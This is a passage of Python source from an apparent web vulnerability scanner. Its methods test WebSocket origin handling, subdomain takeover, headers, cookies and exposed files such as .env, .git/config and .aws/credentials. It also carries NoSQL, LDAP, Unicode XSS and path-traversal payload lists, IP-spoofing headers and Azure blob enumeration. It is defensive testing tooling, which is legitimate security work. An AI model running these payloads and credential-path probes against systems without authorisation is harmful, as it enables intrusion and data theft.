                        has_auth_context = bool(
                            self._session.cookies
                            or self._session.headers.get('Authorization')
                        )
                        reason = (
                            'WebSocket handshake accepted a controlled cross-origin Origin; '
                            'authenticated message access and impact are not proven'
                            if is_cswsh else
                            'WebSocket handshake succeeded without an Origin header; endpoint '
                            'authentication and browser reachability need manual review'
                        )
                        result = {
                            'technique': test['technique'],
                            'bypass': is_cswsh,
                            'status': resp.status_code,
                            'reason': reason,
                            'severity': ('MEDIUM' if is_cswsh and has_auth_context
                                         else 'LOW' if is_cswsh else 'INFO'),
                            'category': 'WEBSOCKET_SECURITY',
                            'kind': 'suspected' if is_cswsh else 'observation',
                            'verification_status': ('candidate' if is_cswsh
                                                    else 'informational'),
                            'confidence': 'medium' if is_cswsh else 'high',
                            'method': 'GET', 'path': test['path'],
                            'url': f"{self.target}{test['path']}",
                            'headers': dict(test['headers']),
                            'request': {
                                'method': 'GET', 'path': test['path'],
                                'url': f"{self.target}{test['path']}",
                                'headers': dict(test['headers']), 'body': None,
                            },
                            'response': {'status': resp.status_code,
                                         'headers': dict(resp.headers)},
                            'evidence': [{
                                'type': 'websocket_origin_acceptance',
                                'description': reason,
                                'matched': test['headers'].get('Origin', 'absent'),
                            }],
                            '_no_reconfirm': True,
                        }
                        results.append(result)
                        if is_cswsh:
                            print(f"  [!] CSWSH candidate: {test['path']} accepts cross-origin")
                    elif resp.status_code == 200 and 'websocket' in resp.text.lower():
                        result = {
                            'technique': f"WS Endpoint Found: {test['path']}",
                            'bypass': False,
                            'status': resp.status_code,
                            'reason': 'WebSocket endpoint detected',
                            'severity': 'INFO',
                            'category': 'WEBSOCKET_SECURITY',
                            'kind': 'observation',
                            'verification_status': 'informational',
                        }
                        results.append(result)
                        
            except Exception as e:
                logger.debug(f"WebSocket test error: {e}")
        
        return results

    # ============================================================================
    # MEDIUM VALUE SECURITY TESTS
    # ============================================================================
    
    def _test_subdomain_takeover(self) -> List[Dict[str, Any]]:
        """Find existing subdomains with provider-specific unclaimed-site proof.

        NXDOMAIN alone is never a takeover: without an existing delegated DNS
        record there is nothing for an attacker to claim.
        """
        results = []
        print("  [*] Testing subdomain takeover...")
        
        # Restrict matches to provider-specific *unclaimed resource* messages.
        # Generic provider domains and generic 404 text are not evidence.
        takeover_fingerprints = {
            'github_pages': ["There isn't a GitHub Pages site here"],
            'heroku': ['No such app'],
            'aws_s3': ['<Code>NoSuchBucket</Code>',
                       'The specified bucket does not exist'],
            'azure_web_apps': ['404 Web Site not found'],
            'shopify': ['Sorry, this shop is currently unavailable'],
            'surge': ['project not found'],
            'fastly': ['Fastly error: unknown domain'],
            'pantheon': ['The gods are wise, but do not know of the site'],
            'zendesk': ['Help Center Closed'],
        }
        
        # First enumerate subdomains
        target_hostname = urlparse(self.target).hostname or self.domain
        # Do not guess eTLD+1 by taking the last two labels (which would turn
        # app.example.co.uk into the unrelated public suffix co.uk). Without a
        # PSL dependency, stay beneath the exact authorized hostname.
        base_domain = target_hostname
        
        prefixes = ['www', 'dev', 'staging', 'test', 'api', 'app', 'admin', 'beta', 'cdn', 'mail', 'blog', 'shop', 'store']
        
        def check_takeover(subdomain: str) -> Optional[Dict]:
            try:
                # An existing address/delegation is a prerequisite. NXDOMAIN is
                # an ordinary absent name and must not be reported.
                try:
                    socket.getaddrinfo(subdomain, None)
                except socket.gaierror:
                    return None

                for protocol in ['https', 'http']:
                    try:
                        url = f"{protocol}://{subdomain}"
                        resp = self._scoped_safe_request(url, timeout=5, allow_redirects=True)
                        
                        if resp is not None:
                            body = resp.text.lower()
                            for service, fingerprints in takeover_fingerprints.items():
                                for fp in fingerprints:
                                    if fp.lower() in body:
                                        return {
                                            'subdomain': subdomain,
                                            'service': service,
                                            'fingerprint': fp,
                                            'status': resp.status_code
                                        }
                    except:
                        pass
                        
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            subdomains = [f"{prefix}.{base_domain}" for prefix in prefixes]
            futures = {executor.submit(check_takeover, sub): sub for sub in subdomains}
            
            for future in as_completed(futures):
                result_data = future.result()
                if result_data:
                    result = {
                        'technique': f"Subdomain Takeover: {result_data['subdomain']}",
                        'bypass': True,
                        'status': result_data['status'],
                        'reason': f"Service: {result_data['service']} | {result_data['fingerprint'][:40]}",
                        'severity': 'HIGH',
                        'category': 'SUBDOMAIN_TAKEOVER',
                        'kind': 'suspected', 'verification_status': 'candidate',
                        'confidence': 'medium',
                        'evidence': [{
                            'type': 'provider_unclaimed_fingerprint',
                            'description': ('Existing host returned a provider-specific '
                                            'unclaimed-resource message'),
                            'matched': result_data['fingerprint'],
                        }],
                        'details': result_data,
                        '_no_reconfirm': True,
                    }
                    results.append(result)
                    print(f"  [!] Takeover candidate: {result_data['subdomain']} "
                          f"({result_data['service']}; verify claimability)")
        
        return results
    
    def _test_security_headers(self) -> List[Dict[str, Any]]:
        """Audit security headers for misconfigurations"""
        results = []
        print("  [*] Auditing security headers...")
        
        try:
            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if resp is None:
                return results
            
            headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            
            # Required security headers
            security_headers = {
                'strict-transport-security': {
                    'name': 'HSTS',
                    'severity': 'MEDIUM',
                    'recommendation': 'Add Strict-Transport-Security header'
                },
                'content-security-policy': {
                    'name': 'CSP',
                    'severity': 'MEDIUM',
                    'recommendation': 'Implement Content-Security-Policy'
                },
                'x-content-type-options': {
                    'name': 'X-Content-Type-Options',
                    'severity': 'LOW',
                    'recommendation': 'Add X-Content-Type-Options: nosniff'
                },
                'x-frame-options': {
                    'name': 'X-Frame-Options',
                    'severity': 'MEDIUM',
                    'recommendation': 'Add X-Frame-Options: DENY or SAMEORIGIN'
                },
                'x-xss-protection': {
                    'name': 'X-XSS-Protection',
                    'severity': 'LOW',
                    'recommendation': 'Consider X-XSS-Protection (legacy browsers)'
                },
                'referrer-policy': {
                    'name': 'Referrer-Policy',
                    'severity': 'LOW',
                    'recommendation': 'Add Referrer-Policy header'
                },
                'permissions-policy': {
                    'name': 'Permissions-Policy',
                    'severity': 'LOW',
                    'recommendation': 'Implement Permissions-Policy'
                },
                'cross-origin-opener-policy': {
                    'name': 'COOP',
                    'severity': 'LOW',
                    'recommendation': 'Consider Cross-Origin-Opener-Policy'
                },
                'cross-origin-resource-policy': {
                    'name': 'CORP',
                    'severity': 'LOW',
                    'recommendation': 'Consider Cross-Origin-Resource-Policy'
                },
                'cross-origin-embedder-policy': {
                    'name': 'COEP',
                    'severity': 'LOW',
                    'recommendation': 'Consider Cross-Origin-Embedder-Policy'
                },
            }
            
            missing_headers = []
            present_headers = []
            
            for header, info in security_headers.items():
                if header not in headers_lower:
                    missing_headers.append(info)
                else:
                    present_headers.append({**info, 'value': headers_lower[header]})
            
            # Check for dangerous headers
            dangerous_headers = {
                'server': 'Server version disclosure',
                'x-powered-by': 'Technology disclosure',
                'x-aspnet-version': 'ASP.NET version disclosure',
                'x-aspnetmvc-version': 'ASP.NET MVC version disclosure',
            }
            
            for header, description in dangerous_headers.items():
                if header in headers_lower:
                    result = {
                        'technique': f'Security Header: {description}',
                        'bypass': False,
                        'status': resp.status_code,
                        'reason': f'{header}: {headers_lower[header]}',
                        'severity': 'LOW',
                        'category': 'SECURITY_HEADERS'
                    }
                    results.append(result)
                    print(f"  [!] Info Disclosure: {header} = {headers_lower[header]}")
            
            # Report missing headers
            for info in missing_headers:
                result = {
                    'technique': f"Missing Header: {info['name']}",
                    'bypass': False,
                    'status': resp.status_code,
                    'reason': info['recommendation'],
                    'severity': info['severity'],
                    'category': 'SECURITY_HEADERS'
                }
                results.append(result)
            
            # Check CSP quality if present
            if 'content-security-policy' in headers_lower:
                csp = headers_lower['content-security-policy']
                csp_issues = []
                
                if 'unsafe-inline' in csp:
                    csp_issues.append("'unsafe-inline' allows inline scripts")
                if 'unsafe-eval' in csp:
                    csp_issues.append("'unsafe-eval' allows eval()")
                if '*' in csp and 'script-src' in csp:
                    csp_issues.append("Wildcard in script-src")
                if 'data:' in csp:
                    csp_issues.append("data: URI scheme allowed")
                
                for issue in csp_issues:
                    result = {
                        'technique': f'Weak CSP: {issue}',
                        'bypass': True,
                        'status': resp.status_code,
                        'reason': issue,
                        'severity': 'MEDIUM',
                        'category': 'SECURITY_HEADERS'
                    }
                    results.append(result)
                    print(f"  [!] Weak CSP: {issue}")
            
            print(f"  [*] Missing {len(missing_headers)} security headers")
            
        except Exception as e:
            logger.debug(f"Security header audit error: {e}")
        
        return results
    
    def _test_cookie_security(self) -> List[Dict[str, Any]]:
        """Test cookie security flags"""
        results = []
        print("  [*] Testing cookie security...")
        
        try:
            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if resp is None:
                return results
            
            # Parse Set-Cookie headers
            set_cookies = resp.headers.get('Set-Cookie', '')
            if not set_cookies:
                cookies_raw = resp.raw.headers.getlist('Set-Cookie') if hasattr(resp.raw, 'headers') else []
            else:
                cookies_raw = [set_cookies] if isinstance(set_cookies, str) else list(set_cookies)
            
            for cookie_str in cookies_raw:
                cookie_lower = cookie_str.lower()
                cookie_name = cookie_str.split('=')[0].strip() if '=' in cookie_str else 'unknown'
                
                issues = []
                
                # Check for missing flags
                if 'httponly' not in cookie_lower:
                    issues.append('Missing HttpOnly flag')
                
                if 'secure' not in cookie_lower and self.target.startswith('https'):
                    issues.append('Missing Secure flag')
                
                if 'samesite' not in cookie_lower:
                    issues.append('Missing SameSite attribute')
                elif 'samesite=none' in cookie_lower and 'secure' not in cookie_lower:
                    issues.append('SameSite=None without Secure flag')
                
                # Check for sensitive cookies
                sensitive_patterns = ['session', 'token', 'auth', 'jwt', 'api_key', 'csrf', 'xsrf']
                is_sensitive = any(p in cookie_name.lower() for p in sensitive_patterns)
                
                if issues:
                    severity = 'HIGH' if is_sensitive and 'HttpOnly' in str(issues) else 'MEDIUM' if is_sensitive else 'LOW'
                    result = {
                        'technique': f'Insecure Cookie: {cookie_name}',
                        'bypass': is_sensitive,
                        'status': resp.status_code,
                        'reason': '; '.join(issues),
                        'severity': severity,
                        'category': 'COOKIE_SECURITY',
                        'details': {'cookie': cookie_name, 'issues': issues}
                    }
                    results.append(result)
                    print(f"  [!] Cookie {cookie_name}: {', '.join(issues)}")
                    
        except Exception as e:
            logger.debug(f"Cookie security test error: {e}")
        
        return results
    
    def _test_information_disclosure(self) -> List[Dict[str, Any]]:
        """Test for sensitive information disclosure"""
        results = []
        print("  [*] Testing information disclosure...")
        
        disclosure_paths = [
            # Version control
            ('/.git/config', 'Git config', 'CRITICAL'),
            ('/.git/HEAD', 'Git HEAD', 'CRITICAL'),
            ('/.svn/entries', 'SVN entries', 'CRITICAL'),
            ('/.hg/hgrc', 'Mercurial config', 'CRITICAL'),
            ('/.bzr/README', 'Bazaar repo', 'HIGH'),
            
            # Environment/Config files
            ('/.env', 'Environment file', 'CRITICAL'),
            ('/.env.local', 'Local env file', 'CRITICAL'),
            ('/.env.production', 'Production env', 'CRITICAL'),
            ('/.env.backup', 'Env backup', 'CRITICAL'),
            ('/config.php', 'PHP config', 'HIGH'),
            ('/config.yml', 'YAML config', 'HIGH'),
            ('/config.json', 'JSON config', 'HIGH'),
            ('/settings.py', 'Django settings', 'HIGH'),
            ('/web.config', 'IIS config', 'HIGH'),
            ('/wp-config.php', 'WordPress config', 'CRITICAL'),
            ('/wp-config.php.bak', 'WP config backup', 'CRITICAL'),
            
            # Debug/Admin endpoints
            ('/phpinfo.php', 'PHP info', 'HIGH'),
            ('/info.php', 'PHP info', 'HIGH'),
            ('/test.php', 'Test file', 'MEDIUM'),
            ('/debug', 'Debug endpoint', 'HIGH'),
            ('/_debug', 'Debug endpoint', 'HIGH'),
            ('/debug.log', 'Debug log', 'HIGH'),
            ('/error.log', 'Error log', 'MEDIUM'),
            ('/access.log', 'Access log', 'MEDIUM'),
            
            # Backups
            ('/backup.sql', 'SQL backup', 'CRITICAL'),
            ('/backup.zip', 'Backup archive', 'CRITICAL'),
            ('/db.sql', 'Database dump', 'CRITICAL'),
            ('/database.sql', 'Database dump', 'CRITICAL'),
            ('/dump.sql', 'Database dump', 'CRITICAL'),
            ('/.sql', 'SQL file', 'HIGH'),
            
            # Package managers
            ('/package.json', 'NPM package', 'LOW'),
            ('/package-lock.json', 'NPM lock', 'LOW'),
            ('/composer.json', 'Composer', 'LOW'),
            ('/composer.lock', 'Composer lock', 'LOW'),
            ('/Gemfile', 'Ruby Gemfile', 'LOW'),
            ('/requirements.txt', 'Python deps', 'LOW'),
            ('/Pipfile', 'Pipenv', 'LOW'),
            
            # CI/CD
            ('/.travis.yml', 'Travis CI', 'MEDIUM'),
            ('/.gitlab-ci.yml', 'GitLab CI', 'MEDIUM'),
            ('/.circleci/config.yml', 'CircleCI', 'MEDIUM'),
            ('/Jenkinsfile', 'Jenkins', 'MEDIUM'),
            ('/.github/workflows', 'GitHub Actions', 'LOW'),
            
            # Cloud configs
            ('/.aws/credentials', 'AWS creds', 'CRITICAL'),
            ('/.docker/config.json', 'Docker config', 'HIGH'),
            ('/Dockerfile', 'Dockerfile', 'LOW'),
            ('/docker-compose.yml', 'Docker compose', 'MEDIUM'),
            
            # Server status
            ('/server-status', 'Apache status', 'MEDIUM'),
            ('/nginx_status', 'Nginx status', 'MEDIUM'),
            ('/status', 'Status page', 'LOW'),
            ('/health', 'Health check', 'INFO'),
            ('/healthz', 'K8s health', 'INFO'),
            ('/metrics', 'Metrics endpoint', 'MEDIUM'),
            
            # API docs
            ('/swagger.json', 'Swagger spec', 'LOW'),
            ('/openapi.json', 'OpenAPI spec', 'LOW'),
            ('/api-docs', 'API docs', 'LOW'),
            ('/graphql', 'GraphQL endpoint', 'LOW'),
            
            # Admin panels
            ('/admin', 'Admin panel', 'MEDIUM'),
            ('/administrator', 'Admin panel', 'MEDIUM'),
            ('/wp-admin', 'WordPress admin', 'LOW'),
            ('/phpmyadmin', 'phpMyAdmin', 'HIGH'),
            ('/adminer.php', 'Adminer', 'HIGH'),
        ]

        # Calibrate against a random missing route so branded soft-404 pages do
        # not become critical ".env" or backup findings.
        soft404 = None
        try:
            missing = f"/__blackthorn_missing_{random.randrange(10**8, 10**9)}"
            soft404 = self._scoped_safe_request(
                f"{self.target}{missing}", timeout=self.timeout,
                allow_redirects=False,
            )
        except Exception:
            soft404 = None

        def disclosure_signature(path: str, response: requests.Response) -> Optional[str]:
            body = response.text[:20000]
            lower = body.lower()
            content = response.content or b''
            rules = []
            if path.startswith('/.git/'):
                rules = [r'(?m)^\s*\[core\]\s*$', r'(?m)^ref:\s+refs/']
            elif path.startswith('/.svn/'):
                rules = [r'(?i)<wc-entries|svn:|^\d+\s+dir']
            elif path.startswith('/.hg/'):
                rules = [r'(?m)^\s*\[(?:paths|ui|web)\]\s*$']
            elif '/.env' in path:
                rules = [r'(?m)^(?:APP_|DB_|AWS_|REDIS_|SECRET_|API_)[A-Z0-9_]*\s*=']
            elif path.endswith(('.sql', '/db.sql', '/dump.sql')):
                rules = [r'(?i)(?:create\s+table|insert\s+into|mysql dump|postgresql database dump)']
            elif path.endswith(('.log',)):
                rules = [r'(?m)^(?:\[[^\]]+\]\s*)?(?:ERROR|CRITICAL|WARNING)\b',
                         r'(?m)"(?:GET|POST|PUT|DELETE)\s+/\S*\s+HTTP/\d']
            elif 'phpinfo' in path or path == '/info.php':
                rules = [r'(?i)<title>phpinfo\(\)', r'(?i)php version\s*</td>']
            elif path.endswith(('package.json', 'package-lock.json')):
                rules = [r'(?s)^\s*\{.{0,500}"(?:name|lockfileVersion|dependencies)"\s*:']
            elif path.endswith(('composer.json', 'composer.lock')):
                rules = [r'(?s)^\s*\{.{0,500}"(?:require|packages|autoload)"\s*:']
            elif path.endswith(('requirements.txt', 'Pipfile', 'Gemfile')):
                rules = [r'(?m)^(?:[A-Za-z0-9_.-]+\s*(?:==|>=|~=)|source\s+["\']|gem\s+["\'])']
            elif path.endswith(('Dockerfile',)):
                rules = [r'(?mi)^FROM\s+[A-Za-z0-9._/-]+']
            elif (path in ('/.travis.yml', '/.gitlab-ci.yml',
                           '/.circleci/config.yml', '/Jenkinsfile')
                  or path.endswith('/docker-compose.yml')):
                rules = [r'(?mi)^(?:stages|jobs|pipeline|image|services|workflows?)\s*:']
            elif path.endswith('.json') and ('swagger' in path or 'openapi' in path):
                rules = [r'(?s)"(?:swagger|openapi)"\s*:\s*"\d']
            elif path == '/.aws/credentials':
                rules = [r'(?mi)^aws_(?:access_key_id|secret_access_key)\s*=']
            elif path in ('/server-status', '/nginx_status', '/metrics'):
                rules = [r'(?i)apache server status', r'(?m)^active connections:\s*\d+',
                         r'(?m)^[A-Za-z_:][A-Za-z0-9_:]*\{?.*\}?\s+[-+0-9.eE]+$']
            elif path.endswith(('.zip',)) and content.startswith(b'PK\x03\x04'):
                return 'ZIP archive magic bytes'
            elif path.endswith(('.php', '.py', '.config', '.yml', '.yaml', '.json')):
                rules = [r'(?i)(?:password|secret|api[_-]?key|database_url|dsn)\s*["\']?\s*[:=]']

            for raw in rules:
                match = re.search(raw, body)
                if match:
                    return match.group(0)[:180]
            return None
        
        def check_path(path_info):
            path, name, severity = path_info
            try:
                resp = self._scoped_safe_request(
                    f"{self.target}{path}",
                    timeout=self.timeout,
                    allow_redirects=False
                )
                
                if resp is not None and resp.status_code == 200:
                    content_len = len(resp.content)
                    if not content_len:
                        return None
                    if soft404 is not None:
                        similarity = difflib.SequenceMatcher(
                            None, _normalize_body(soft404.text),
                            _normalize_body(resp.text),
                        ).quick_ratio()
                        if similarity >= 0.88:
                            return None
                    matched = disclosure_signature(path, resp)
                    if matched:
                        return {
                            'path': path, 'name': name, 'severity': severity,
                            'status': resp.status_code, 'size': content_len,
                            'matched': matched,
                            'content_type': resp.headers.get('Content-Type', ''),
                        }
                            
            except Exception as e:
                logger.debug(f"Disclosure check error for {path}: {e}")
            return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(check_path, p): p for p in disclosure_paths}
            
            for future in as_completed(futures):
                result_data = future.result()
                if result_data:
                    result = {
                        'technique': f"Info Disclosure: {result_data['name']}",
                        'bypass': True,
                        'status': result_data['status'],
                        'reason': f"Found at {result_data['path']} ({result_data['size']} bytes)",
                        'severity': result_data['severity'],
                        'category': 'INFO_DISCLOSURE',
                        'kind': 'finding', 'verification_status': 'confirmed',
                        'confidence': 'high', 'method': 'GET',
                        'path': result_data['path'],
                        'url': f"{self.target}{result_data['path']}",
                        'evidence': [{
                            'type': 'resource_signature',
                            'description': 'Path-specific sensitive-resource signature',
                            'matched': result_data['matched'],
                        }],
                        'details': result_data
                    }
                    results.append(result)
                    print(f"  [✓] {result_data['severity']}: {result_data['name']} at {result_data['path']}")
        
        return results
    
    def _test_nosql_injection(self) -> List[Dict[str, Any]]:
        """Test for NoSQL injection vulnerabilities"""
        results = []
        print("  [*] Testing NoSQL injection...")
        
        # MongoDB injection payloads
        nosql_payloads = [
            # Query operator injection
            ('?username[$ne]=admin', 'MongoDB $ne'),
            ('?username[$gt]=', 'MongoDB $gt'),
            ('?username[$regex]=.*', 'MongoDB $regex'),
            ('?password[$exists]=true', 'MongoDB $exists'),
            ('?$where=1', 'MongoDB $where'),
            ('?username=admin&password[$ne]=x', 'Auth bypass $ne'),
            
            # JSON body injection
            ('{"username": {"$gt": ""}}', 'JSON $gt', True),
            ('{"username": {"$ne": "invalid"}}', 'JSON $ne', True),
            ('{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}', 'JSON $or', True),
            ('{"username": {"$regex": ".*"}}', 'JSON $regex', True),
            ('{"$where": "this.password.length > 0"}', 'JSON $where', True),
            
            # Array injection
            ('?filter[username]=admin', 'Array filter'),
            ('?query[username][$gt]=', 'Query array'),
        ]
        
        test_cases = []
        for payload in nosql_payloads:
            if len(payload) == 3 and payload[2]:  # JSON payload
                continue  # Handle separately
            query_pairs = parse_qsl(urlsplit(payload[0]).query, keep_blank_values=True)
            test_cases.append({
                'headers': {},
                'path': payload[0],
                'technique': f'NoSQL candidate: {payload[1]}',
                'category': 'NOSQL_INJECTION',
                'payload': payload[0],
                'parameter': query_pairs[-1][0] if query_pairs else '',
                'detector_id': 'nosql-matched-differential-v2',
                'oracle': {
                    'type': 'regex',
                    'patterns': [r'mongo(?:db)?error', r'unknown (?:query )?operator',
                                 r'badvalue.{0,80}\$(?:where|regex|ne|gt)',
                                 r'cannot use \$where'],
                    'severity': 'MEDIUM', 'confidence': 'medium',
                    'verification_status': 'candidate', 'kind': 'suspected',
                    'reason': 'NoSQL parser diagnostic appeared only after the operator probe',
                },
            })
        
        batch_results = self._batch_test(test_cases)
        
        # Test JSON payloads
        json_payloads = [p for p in nosql_payloads if len(p) == 3]
        for payload_str, technique, _ in json_payloads:
            try:
                payload = json.loads(payload_str)
                result = self._test_request(
                    method='POST', path='/', data=json.dumps(payload),
                    headers={'Content-Type': 'application/json'},
                    technique=f'NoSQL JSON candidate: {technique}',
                    probe={
                        'category': 'NOSQL_INJECTION', 'payload': payload_str,
                        'insertion_point': {'type': 'json-body', 'name': 'body'},
                        'detector_id': 'nosql-json-differential-v2',
                        'oracle': {
                            'type': 'regex',
                            'patterns': [r'mongo(?:db)?error', r'unknown (?:query )?operator',
                                         r'badvalue.{0,80}\$(?:where|regex|ne|gt)'],
                            'severity': 'MEDIUM', 'confidence': 'medium',
                            'verification_status': 'candidate', 'kind': 'suspected',
                            'reason': ('NoSQL parser diagnostic appeared only after '
                                       'the JSON operator probe'),
                        },
                    },
                )
                if self._result_has_evidence(result, 'response_signature'):
                    results.append(result)
                    print(f"  [!] NoSQL candidate: {technique}")
                        
            except Exception as e:
                logger.debug(f"NoSQL JSON test error: {e}")
        
        for r in batch_results:
            r['category'] = 'NOSQL_INJECTION'
            if self._result_has_evidence(r, 'response_signature'):
                results.append(r)
        
        return results
    
    def _test_ldap_injection(self) -> List[Dict[str, Any]]:
        """Test for LDAP injection vulnerabilities"""
        results = []
        print("  [*] Testing LDAP injection...")
        
        ldap_payloads = [
            # Basic LDAP injection
            ('?user=*', 'Wildcard'),
            ('?user=*)(uid=*))(|(uid=*', 'Filter injection'),
            ('?user=admin)(|(password=*)', 'OR injection'),
            ('?user=*))%00', 'Null byte'),
            ('?user=admin)(&)', 'AND injection'),
            ('?user=admin)(cn=*', 'CN injection'),
            ('?user=*)(objectClass=*', 'ObjectClass enum'),
            ('?user=admin)(!(&(1=0', 'NOT injection'),
            
            # Attribute extraction
            ('?user=*)(userPassword=*', 'Password enum'),
            ('?user=*)(mail=*', 'Email enum'),
            ('?user=*)(telephoneNumber=*', 'Phone enum'),
            
            # Authentication bypass
            ('?user=*))(&(uid=admin', 'Auth bypass'),
            ('?user=admin)(%26)', 'Encoded AND'),
        ]
        
        test_cases = [
            {
                'headers': {}, 'path': path,
                'technique': f'LDAP injection candidate: {technique}',
                'category': 'LDAP_INJECTION', 'payload': path,
                'detector_id': 'ldap-error-differential-v2',
                'oracle': {
                    'type': 'regex',
                    'patterns': [r'ldap.{0,40}(?:filter|syntax|protocol) error',
                                 r'invalid dn syntax', r'bad search filter',
                                 r'unbalanced parenthes'],
                    'severity': 'MEDIUM', 'confidence': 'medium',
                    'verification_status': 'candidate', 'kind': 'suspected',
                    'reason': 'LDAP parser diagnostic appeared only after the filter probe',
                },
            }
            for path, technique in ldap_payloads
        ]
        
        batch_results = self._batch_test(test_cases)
        for r in batch_results:
            r['category'] = 'LDAP_INJECTION'
            if self._result_has_evidence(r, 'response_signature'):
                results.append(r)
        
        return results
    
    def _test_unicode_normalization(self) -> List[Dict[str, Any]]:
        """Test for Unicode normalization WAF bypasses"""
        results = []
        print("  [*] Testing Unicode normalization bypasses...")
        
        # Unicode homoglyphs and normalization attacks
        unicode_payloads = [
            # Homoglyphs for common characters
            ('/?test=＜script＞alert(1)＜/script＞', 'Fullwidth XSS'),
            ('/?test=\u003cscript\u003ealert(1)\u003c/script\u003e', 'Unicode escape XSS'),
            ('/?test=\uff1cscript\uff1ealert(1)\uff1c/script\uff1e', 'Fullwidth brackets'),
            
            # Unicode normalization
            ('/?test=%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE', 'Overlong UTF-8'),
            ('/?test=\u2215etc\u2215passwd', 'Division slash traversal'),
            ('/?test=..%c0%af..%c0%af', 'Overlong traversal'),
            
            # Case folding attacks
            ('/?test=ſcript', 'Long S (ſ→s)'),
            ('/?test=\u0131nput', 'Dotless i'),
            ('/?test=\u212aeyword', 'Kelvin K'),
            
            # Combining characters
            ('/?test=scr\u0307ipt', 'Combining dot'),
            ('/?test=<\u200bscript\u200b>', 'Zero-width space'),
            ('/?test=<\ufeffscript>', 'BOM injection'),
            
            # Right-to-left override
            ('/?test=\u202escript\u202c', 'RTL override'),
            
            # Percent encoding with Unicode
            ('/?test=%E2%80%AEtpircs%E2%80%AC', 'RTL encoded'),
        ]
        
        test_cases = [
            {'headers': {}, 'path': path, 'technique': technique}
            for path, technique in unicode_payloads
        ]
        
        batch_results = self._batch_test(test_cases)
        for r in batch_results:
            r['category'] = 'UNICODE_NORMALIZATION'
            results.append(r)
        
        return results
    
    def _test_json_injection(self) -> List[Dict[str, Any]]:
        """Test for JSON injection and parsing vulnerabilities"""
        results = []
        print("  [*] Testing JSON injection...")
        
        json_payloads = [
            # Duplicate keys (parser-dependent)
            ('{"user":"admin","user":"guest"}', 'Duplicate keys'),
            # Unicode escapes
            ('{"user":"\\u0061\\u0064\\u006d\\u0069\\u006e"}', 'Unicode escape'),
            # Comments (non-standard)
            ('{"user":"admin"/*comment*/}', 'JSON comment'),
            # Trailing data
            ('{"user":"admin"}extra', 'Trailing data'),
            # Scientific notation
            ('{"id":1e308}', 'Scientific notation overflow'),
            # Deep nesting
            ('{"a":' * 100 + '1' + '}' * 100, 'Deep nesting'),
            # Special values
            ('{"value":NaN}', 'NaN value'),
            ('{"value":Infinity}', 'Infinity value'),
            # Null byte
            ('{"user":"admin\\u0000"}', 'Null byte in value'),
        ]
        
        for payload, technique in json_payloads:
            try:
                result = self._test_request(
                    method='POST', path='/', data=payload,
                    headers={'Content-Type': 'application/json'},
                    technique=f'JSON parser behavior: {technique}',
                    probe={
                        'category': 'JSON_INJECTION', 'payload': payload,
                        'insertion_point': {'type': 'json-body', 'name': 'body'},
                        'detector_id': 'json-parser-observation-v2',
                        'control': {
                            'method': 'POST', 'path': '/',
                            'headers': {'Content-Type': 'application/json'},
                            'data': '{"blackthorn_control":true}',
                        },
                    },
                )
                if result is not None and result.get('status') not in [400, 415]:
                    result.update({
                        'bypass': False, 'kind': 'observation',
                        'verification_status': 'informational', 'confidence': 'high',
                        'severity': 'INFO',
                        'reason': ('Parser accepted this JSON variant; acceptance alone '
                                   'is not an injection vulnerability'),
                    })
                    results.append(result)
                    print(f"  [+] JSON parser accepted: {technique}")
                        
            except Exception as e:
                logger.debug(f"JSON injection test error: {e}")
        
        return results
    
    def _test_ip_spoofing_headers(self) -> List[Dict[str, Any]]:
        """Extended IP spoofing via various headers"""
        results = []
        print("  [*] Testing extended IP spoofing headers...")
        
        # Extended list of IP headers
        ip_headers = [
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Client-IP',
            'X-Originating-IP',
            'X-Remote-IP',
            'X-Remote-Addr',
            'CF-Connecting-IP',  # Cloudflare
            'True-Client-IP',    # Akamai
            'X-Cluster-Client-IP',
            'X-ProxyUser-Ip',
            'Forwarded',
            'Forwarded-For',
            'X-Forwarded',
            'Client-IP',
            'Real-IP',
            'Via',
            'X-Custom-IP-Authorization',
        ]
        
        # Test IPs
        test_ips = [
            '127.0.0.1',
            '10.0.0.1',
            '192.168.1.1',
            '172.16.0.1',
            '169.254.169.254',
            '::1',
            '0.0.0.0',
            'localhost',
        ]
        
        test_cases = []
        for header in ip_headers:
            for ip in test_ips[:3]:  # Limit combinations
                test_cases.append({
                    'headers': {header: ip},
                    'technique': f'{header}: {ip}'
                })
        
        # Also test chained headers
        test_cases.append({
            'headers': {
                'X-Forwarded-For': '127.0.0.1, 10.0.0.1',
                'X-Real-IP': '127.0.0.1',
                'X-Client-IP': '127.0.0.1'
            },
            'technique': 'Chained IP headers'
        })
        
        batch_results = self._batch_test(test_cases)
        for r in batch_results:
            r['category'] = 'IP_SPOOFING'
            results.append(r)
        
        return results

    # ============================================================================
    # CLOUD-SPECIFIC TESTS
    # ============================================================================
    
    def _test_azure_blob_enumeration(self) -> List[Dict[str, Any]]:
        """Test for misconfigured Azure Blob Storage"""
        results = []
        print("  [*] Testing Azure Blob Storage...")
        
        # Extract potential storage account names from domain
        domain_parts = self.domain.replace('.', '-').split('-')
        potential_accounts = [
            self.domain.split('.')[0],
            ''.join(domain_parts[:2]),
            domain_parts[0] if domain_parts else 'storage',
        ]
        
        container_names = [
            'public', 'data', 'files', 'assets', 'images', 'uploads',
            'backup', 'backups', 'logs', 'static', 'media', 'content',
            'documents', 'downloads', 'temp', 'test', 'dev', 'prod'
        ]
        
        def check_azure_blob(account: str, container: str) -> Optional[Dict]:
            try:
                url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
                resp = self._scoped_safe_request(url, timeout=5)
                
                if resp is not None and resp.status_code == 200:
                    if 'EnumerationResults' in resp.text or '<Blob>' in resp.text:
                        return {
                            'account': account,
                            'container': container,
                            'url': url,
                            'status': resp.status_code
                        }
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for account in potential_accounts:
                for container in container_names:
                    futures.append(
                        executor.submit(check_azure_blob, account, container)
                    )
            
            for future in as_completed(futures):
                result_data = future.result()
                if result_data:
                    result = {
                        'technique': f"Azure Blob: {result_data['account']}/{result_data['container']}",
                        'bypass': True,
